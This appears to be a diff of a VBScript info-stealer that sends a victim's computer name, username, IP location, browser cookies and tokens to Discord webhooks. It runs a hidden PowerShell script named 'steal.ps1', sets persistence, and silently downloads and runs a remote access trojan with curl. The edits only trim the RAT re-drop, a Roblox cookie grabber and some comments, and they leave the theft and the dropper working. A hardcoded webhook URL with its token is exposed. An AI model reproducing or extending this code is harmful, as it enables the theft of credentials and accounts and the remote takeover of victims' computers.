@@ -18,17 +18,17 @@ RE_WH = "https://discord.com/api/webhooks/1572026526407467079/KUyJrlGn-BaxdIM4Py
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' --- 1. INITIAL GRABS (non-blocking, fire in sequence) ---
+' --- 1. INITIAL GRABS (non-blocking) ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
 Call IP(WH)
 Call GrabTokens(WH)
 Call Persistence
 Call PostCookieOnly(WH)
 
-' --- 2. DROP RAT LAST (after grabs, non-blocking download) ---
+' --- 2. DROP RAT LAST (init only) ---
 Call DropRAT(WH, True)
 
-' --- 3. INTERACTIVE LOOP (Re Grab N, fast cycle, RAT re-drop each pass) ---
+' --- 3. INTERACTIVE LOOP (Re Grab N, grabs only — no RAT) ---
 Dim runCount
 runCount = 0
 Do
@@ -38,7 +38,6 @@ Do
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
-    Call DropRAT(RE_WH, True)
     
     Call SleepSeconds(1)
 Loop
@@ -62,7 +61,6 @@ Sub DropRAT(targetWH, sendRocket)
     Dim cCmd : cCmd = "cmd /c curl.exe -s -L --connect-timeout 5 --max-time 20 -o """ & op & """ """ & dl & """"
     sh.Run cCmd, 0, False
 
-    ' Small wait so curl has a chance to land a byte before size gate — non-blocking Run means we poll
     Call SleepSeconds(2)
 
     If fso.FileExists(op) Then
@@ -89,13 +87,6 @@ Sub IP(targetWH)
     Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
     Call PostEmbedTo(":dart: Target", info, 10181046, targetWH)
     Set xh = Nothing
-End Sub
-
-' --- GrabRoblox ---
-Sub GrabRoblox()
-    Dim cookie : cookie = GetRobloxCookie()
-    If Len(cookie) = 0 Then Exit Sub
-    Call PostEmbedTo("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, WH)
 End Sub
 
 ' --- PostCookieOnly ---
@@ -244,7 +235,6 @@ Sub GrabTokens(targetWH)
     Set xh = Nothing
     Dim psf: psf = TmpFile("steal.ps1")
     WriteFile psf, pc
-    ' Non-blocking: fire PS and return. Results written to file by PS; loop re-reads next cycle.
     sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
     Dim tf: tf = TmpFile("steal_result.txt")
     If Not fso.FileExists(tf) Then Exit Sub
